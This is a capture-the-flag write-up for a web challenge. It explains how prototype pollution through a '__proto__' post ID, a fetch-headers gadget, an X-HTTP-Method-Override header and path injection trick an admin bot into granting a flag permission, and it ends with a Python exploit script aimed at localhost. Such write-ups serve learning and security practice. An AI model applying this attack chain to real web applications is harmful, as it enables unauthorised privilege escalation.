+ two containers: API server and frontend server
+ the requests from the frontender server to the API server is cross-origin. To make it able to do that, the API server provides CORS headers like Access-Control-Allow-Origin and Access-Control-Allow-Methods.
+ You can get the flag at `/api/post/:id/has_enough_permission_to_get_the_flag` on the API server, but you need to make a post's post['permission]['flag'] truthy.
  ```
  get '/api/post/:id/has_enough_permission_to_get_the_flag' do
    id = params['id']
    if !posts.key?(id)
        return { 'error' => 'no such post' }.to_json
    end

    permission = posts[id]['permission']
    if !permission || !permission['flag']
        return { 'flag' => 'nope' }.to_json
    end

    return { 'flag' => FLAG }.to_json
  ```
  
+ post['permission]['flag'] is set true when a post get 1,000,000,000,000 likes, but as you can see the code of /api/post/:id/like, the maximum number of likes is 5,000.
+ There is an API where you can update information of posts, but only admin can change permission. In other words, if you can let admin make requests to this API, you can get the flag.
```
  put '/api/post/:id' do
    token = request.env['HTTP_AUTHORIZATION']
    is_admin = token == ADMIN_KEY

    id = params['id']
    if !posts.key?(id)
        return { 'error' => 'no such post' }.to_json
    end

    id = params['id']
    if SAMPLE_IDS.include?(id)
        return { 'error' => 'sample post should not be updated' }.to_json
    end

    if !is_admin && params['permission']
        return { 'error' => 'only admin can change the parameter' }.to_json
    end

    if !(params['title'] || params['content'])
        return { 'error' => 'no title and content specified' }.to_json
    end

    posts[id].merge!(params)
    return posts[id].to_json
```

+ This is a code that retrieves information of multiple articles. It sequentially fetches data from /api/post/(ID) and stores the data on posts.
+ post can be Object.prototype because it is initialized by post = posts[id], where id is given by a user, and you can inject __proto__ as an ID.
+ `data` is data fetched from API and will not be updated when res.post is falsy. This means that it uses the data of the previous article when fetching data from API fails. Fetching data fails when the article corresponds to ID given does not exist like __proto__.
+ if it fetches data in the order of a malicious article, then __proto__, you can pollute Object.prototype. You can easily prepare malicious object using PUT /api/post/:id because it accepts anything as long as permission property is not in the parameters you submit.
+ gadget for prototype pollution: fetch(https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis)
+ For example, when you pollute Object.prototype.headers, even though no headers are given as fetch options, additional headers will be sent. After Object.prototype is polluted, admin will push like button and a request to add likes will be sent, so you can control this request.
+ Referring to Access-Control-Allow-Methods, you can see that the API server only allows GET, POST, OPTIONS requests from cross-origin websites. However, you have to use PUT method to let admin update our article's information.
+ by polluting Object.prototype.headers['X-HTTP-Method-Override'] to PUT, the API server treats the request as a PUT request, even though the real method is POST.
+ Two problems yet to be solved:
  - the route to add likes is /api/post/:id/like, but the route you want to call is /api/post/:id
  - to let admin send permission[flag]=yes as a parameter.
+ You can solve both by using (article ID that exists)?title=piyo&permission[flag]=yes& as an ID of articles. The path fetch uses will be like /api/post/(article ID that exists)?title=piyo&permission[flag]=yes&/like, so the browser will send a request to /api/post/(article ID that exists)

Exploit.py
```
import requests

API_BASE_URL = 'http://localhost:8400'
FRONTEND_BASE_URL = 'http://localhost:8401'

r = requests.post(f'{API_BASE_URL}/api/post', data={
    'title': 'aaa',
    'content': 'aaa'
})
id = r.json()['post']['id']

data = {
    'title': 'bbb',
    'content': 'bbb',
    'headers[X-HTTP-Method-Override]': 'PUT'
}
r = requests.put(f'{API_BASE_URL}/api/post/{id}', data='&'.join(f'{k}={v}' for k, v in data.items()), headers={
    'Content-Type': 'application/x-www-form-urlencoded'
})

payload = f'{id}%3ftitle%3dpiyo%26permission%5bflag%5d%3dyes%26,{id},__proto__,a'
print(f'report {payload}')
print(f'then, access {API_BASE_URL}/api/post/{id}/has_enough_permission_to_get_the_flag')
```



https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119
